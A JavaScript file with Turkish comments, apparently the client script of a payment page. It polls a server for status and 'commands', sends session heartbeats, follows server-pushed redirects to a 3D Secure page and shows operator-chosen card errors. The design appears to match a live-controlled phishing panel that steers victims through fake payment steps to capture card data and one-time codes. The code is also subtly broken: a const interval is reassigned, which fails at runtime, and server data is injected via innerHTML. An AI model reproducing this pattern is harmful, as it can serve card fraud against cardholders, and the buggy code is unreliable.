/**
 * payment_gateway.js — Ödeme İşlemi Takip Scripti
 * Version: 20
 */

// Global değişkenler
let lastStatus = '';
let isRedirecting = false;
let redirectCount = 0;
let redirectCheckCounter = 0;
const MAX_REDIRECTS = 3; // Maksimum yönlendirme sayısı
let lastCheckTime = 0;
const CHECK_INTERVAL = 5000; // 5 saniye

// Sayfa yüklendiğinde çalışacak kod
document.addEventListener('DOMContentLoaded', () => {
    console.log("Payment Gateway JS loaded (v20)");
    
    // Current URL'i saklayalım
    const currentPage = window.location.pathname;
    console.log("Current page:", currentPage);
    
    // Payment processing sayfasında ve 3D doğrulama sonrasıysa, polling'i yavaşlat
    if (currentPage.includes('payment_processing.php') && getTransactionIdFromPage()) {
        console.log("On payment_processing page after 3D verification, using slower polling");
        // İlk birkaç kontrolden sonra hızı düşür
        setTimeout(() => {
            CHECK_INTERVAL = 10000; // 10 saniye
            console.log("Reduced polling frequency to 10s");
        }, 15000); // 15 saniye sonra
    }
    
    const orderId = getOrderIdFromPage();
    const transactionId = getTransactionIdFromPage();
    
    if (orderId) {
        document.querySelector('.payment-container')?.setAttribute('data-order-id', orderId);
        if (!document.getElementById('order_id')) {
            const hidden = document.createElement('input');
            hidden.type = 'hidden';
            hidden.id = 'order_id';
            hidden.value = orderId;
            document.body.appendChild(hidden);
        }
    }
    
    // İlk kontrol
    if (transactionId) {
        console.log("Starting polling with transaction ID:", transactionId);
        pollWithTransactionId(transactionId);
    } else if (orderId) {
        console.log("Starting polling with order ID:", orderId);
        pollForCommand(orderId);
    } else {
        console.error("Sipariş veya işlem ID bulunamadı!");
    }
    
    // Periyodik kontroller başlat
    startPolling();
});

/**
 * Periyodik kontrolleri başlatır
 */
function startPolling() {
    // Heartbeat için interval
    setInterval(sendHeartbeat, 15000);
    
    // Ödeme durumu kontrolü için interval
    setInterval(() => {
        // Son kontrolden bu yana yeterli süre geçti mi?
        const now = Date.now();
        if (now - lastCheckTime < CHECK_INTERVAL) {
            return;
        }
        
        // Yönlendirme yapılıyorsa kontrole gerek yok
        if (isRedirecting) {
            return;
        }
        
        const orderId = getOrderIdFromPage();
        const transactionId = getTransactionIdFromPage();
        
        // Maximum sayıda kontrol yaptık, burası sonuç sayfası mı?
        if (redirectCheckCounter >= 10) {
            // Eğer payment_processing.php sayfasındaysak ve status değişmemişse
            // ve transaction ID varsa, polling'i durduralım
            if (window.location.pathname.includes('payment_processing.php') && 
                lastStatus === 'processing' && transactionId) {
                console.log("Maximum checks reached. Reducing polling frequency significantly.");
                redirectCheckCounter = 0; // Sıfırlayalım
                CHECK_INTERVAL = 20000; // 20 saniye 
                return;
            }
        }
        
        redirectCheckCounter++;
        
        if (transactionId) {
            pollWithTransactionId(transactionId);
        } else if (orderId) {
            pollForCommand(orderId);
        }
        
        lastCheckTime = now;
    }, 1000); // Her saniye kontrol et, ama gerçek istekler CHECK_INTERVAL'e göre
}

/**
 * Transaction ID ile durum kontrolü yapar
 */
function pollWithTransactionId(tID) {
    // Sayfa zaten yönlendiriliyorsa işlemi durdur
    if (isRedirecting) return;
    
    console.log("Polling with transaction ID:", tID);
    
    // Her istekte farklı bir timestamp parametresi ekleyerek cache'i engelle
    const timestamp = new Date().getTime();
    
    fetch(`check_payment_status.php?t=${tID}&_=${timestamp}`, {
        method: 'GET',
        headers: {
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Cache-Control': 'no-cache, no-store, must-revalidate'
        },
        credentials: 'same-origin'
    })
    .then(res => {
        if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
        return res.json();
    })
    .then(data => {
        console.log("İşlem durumu kontrol edildi (t):", data);
        handlePaymentResponse(data);
    })
    .catch(err => console.error("3D durumu kontrol hatası:", err));
}

/**
 * Sunucuya düzenli olarak oturum canlılık sinyali gönderir
 */
function sendHeartbeat() {
    const orderId = getOrderIdFromPage();
    if (!orderId) return;
    
    fetch(`check_payment_status.php?action=ping_session&order_id=${orderId}`, {
        method: 'GET',
        headers: {'X-Requested-With':'XMLHttpRequest'}
    }).catch(err => console.error("Heartbeat hatası:", err));
}

/**
 * Sunucudan ödeme durumu ve komutları kontrol eder
 */
function pollForCommand(orderId) {
    // Sayfa zaten yönlendiriliyorsa işlemi durdur
    if (isRedirecting) return;
    
    if (!orderId) {
        orderId = getOrderIdFromPage();
    }
    
    if (!orderId) {
        console.error("Sipariş ID bulunamadı!");
        return;
    }
    
    console.log("Polling with order ID:", orderId);

    // Her istekte farklı bir timestamp parametresi ekleyerek cache'i engelle
    const timestamp = new Date().getTime();
    
    fetch(`check_payment_status.php?order_id=${orderId}&_=${timestamp}`, {
        method: 'GET',
        headers: {
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Cache-Control': 'no-cache, no-store, must-revalidate'
        },
        credentials: 'same-origin'
    })
    .then(res => {
        if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
        return res.json();
    })
    .then(data => {
        console.log("Ödeme durumu kontrol edildi:", data);
        handlePaymentResponse(data);
    })
    .catch(err => console.error("Komut kontrol hatası:", err));
}

/**
 * Ödeme yanıtını işler
 */
function handlePaymentResponse(data) {
    // Başarılı yanıt değilse işlemi durdur
    if (!data.success) {
        console.error("Başarısız yanıt:", data);
        return;
    }

    // Yönlendirme varsa, sayfayı yönlendir
    if (data.redirect_url) {
        // Aynı sayfaya sonsuz yönlendirme sorununu önlemek için
        if (redirectCount >= MAX_REDIRECTS) {
            console.warn("Maksimum yönlendirme sayısına ulaşıldı!");
            return;
        }
        
        // Mevcut URL ile aynı değilse yönlendir
        const currentPath = window.location.pathname;
        const redirectPath = data.redirect_url.split('?')[0]; // Parametreleri çıkar
        
        // Eğer payment_processing.php sayfasındaysa ve 3D ID varsa, yönlendirme görmezden gel
        if (currentPath.includes('payment_processing.php') && getTransactionIdFromPage()) {
            if (redirectPath.includes('3dsecure.php')) {
                console.log("Ignoring redirect to 3dsecure.php from payment_processing.php");
                return;
            }
        }
        
        if (currentPath !== '/' + redirectPath) {
            console.log(`Redirecting from ${currentPath} to ${redirectPath}`);
            isRedirecting = true;
            redirectCount++;
            window.location.href = data.redirect_url;
            return;
        } else {
            console.log("Ignoring redirect to same page:", currentPath);
        }
    }
    
    // Durum değişmişse güncelle
    if (data.status && data.status !== lastStatus) {
        lastStatus = data.status;
        updatePaymentStatus(data.status, data.message || '');
    }
    
    // 3D Kodu varsa göster
    if (data.code) {
        show3DCode(data.code);
    }
}

/**
 * Sayfadan sipariş ID'sini alır
 */
function getOrderIdFromPage() {
    // Öncelikle gizli input alanını kontrol et
    const input = document.getElementById('order_id');
    if (input) return input.value;
    
    // URL parametrelerini kontrol et
    const params = new URLSearchParams(window.location.search);
    if (params.has('order_id')) return params.get('order_id');
    
    // data-order-id özelliğini kontrol et
    const container = document.querySelector('.payment-container');
    return container?.dataset.orderId || null;
}

/**
 * Sayfadan işlem ID'sini alır
 */
function getTransactionIdFromPage() {
    // Gizli input alanını kontrol et
    const input = document.getElementById('transaction_id');
    if (input) return input.value;
    
    // URL parametrelerini kontrol et
    const params = new URLSearchParams(window.location.search);
    if (params.has('t')) return params.get('t');
    
    return null;
}

/**
 * Ödeme durumunu günceller ve arayüzü değiştirir
 */
function updatePaymentStatus(status, message) {
    const processing = document.getElementById('processingScreen');
    const confirm = document.getElementById('confirmationMessage');
    const text = document.getElementById('messageText');
    
    if (text) {
        text.textContent = message || getDefaultMessage(status);
    }

    // Durum başarılı ise
    if (['success', 'completed', 'GREAT'].includes(status)) {
        if (processing) processing.style.display = 'none';
        if (confirm) {
            confirm.classList.remove('alert-danger', 'alert-info', 'alert-warning');
            confirm.classList.add('alert-success');
            confirm.style.display = 'block';
            
            // Icon güncelle
            const icon = confirm.querySelector('.processing-icon');
            if (icon) {
                icon.classList.remove('error-icon');
                icon.innerHTML = '<i class="fas fa-check-circle"></i>';
            }
        }
    } 
    // Durum başarısız ise
    else if (['failed', 'error', 'cancelled', 'cvv_error', 'card_error', 'insufficient_funds'].includes(status)) {
        if (processing) processing.style.display = 'none';
        if (confirm) {
            confirm.classList.remove('alert-success', 'alert-info', 'alert-warning');
            confirm.classList.add('alert-danger');
            confirm.style.display = 'block';
            
            // Icon güncelle
            const icon = confirm.querySelector('.processing-icon');
            if (icon) {
                icon.classList.add('error-icon');
                icon.innerHTML = '<i class="fas fa-exclamation-circle"></i>';
            }
            
            // Ana sayfaya dön butonu ekle
            if (!confirm.querySelector('.btn-primary')) {
                const btnContainer = document.createElement('div');
                btnContainer.classList.add('mt-4');
                
                const btn = document.createElement('a');
                btn.href = 'index.php';
                btn.className = 'btn btn-primary';
                btn.textContent = 'Ana Sayfaya Dön';
                
                btnContainer.appendChild(btn);
                confirm.appendChild(btnContainer);
            }
        }
    }
    // İşlem devam ediyor ise
    else if (['pending', 'processing', '3d_pending'].includes(status)) {
        if (processing) processing.style.display = 'flex';
        if (confirm) confirm.style.display = 'none';
    }
}

/**
 * Duruma göre varsayılan mesajları döndürür
 */
function getDefaultMessage(status) {
    const messages = {
        success: 'Ödeme işlemi başarıyla tamamlandı!',
        completed: 'Ödeme işlemi başarıyla tamamlandı!',
        GREAT: 'Ödeme işlemi başarıyla tamamlandı!',
        processing: 'Ödemeniz işleniyor, lütfen bekleyin...',
        pending: 'Ödeme işlemi bekleniyor...',
        failed: 'Ödeme işlemi başarısız oldu.',
        error: 'Ödeme işlemi başarısız oldu.',
        cancelled: 'Ödeme işlemi iptal edildi.',
        '3d_pending': '3D Secure doğrulama bekleniyor...',
        cvv_error: 'CVV kodu hatalı. Lütfen tekrar deneyiniz.',
        card_error: 'Kart bilgileri hatalı. Lütfen kontrol ediniz.',
        insufficient_funds: 'Kart bakiyesi yetersiz. Lütfen başka bir kart deneyiniz.'
    };
    
    return messages[status] || `Ödeme durumu: ${status}`;
}

/**
 * 3D Güvenlik kodunu gösterir
 */
function show3DCode(code) {
    const confirm = document.getElementById('confirmationMessage');
    const text = document.getElementById('messageText');
    
    if (confirm && text) {
        text.innerHTML = `<strong>3D Güvenlik Kodu:</strong> <span class="badge bg-primary">${code}</span>`;
        confirm.className = 'alert alert-info';
        confirm.style.display = 'block';
        
        // İşlem ekranını gizle
        const processing = document.getElementById('processingScreen');
        if (processing) processing.style.display = 'none';
    }
}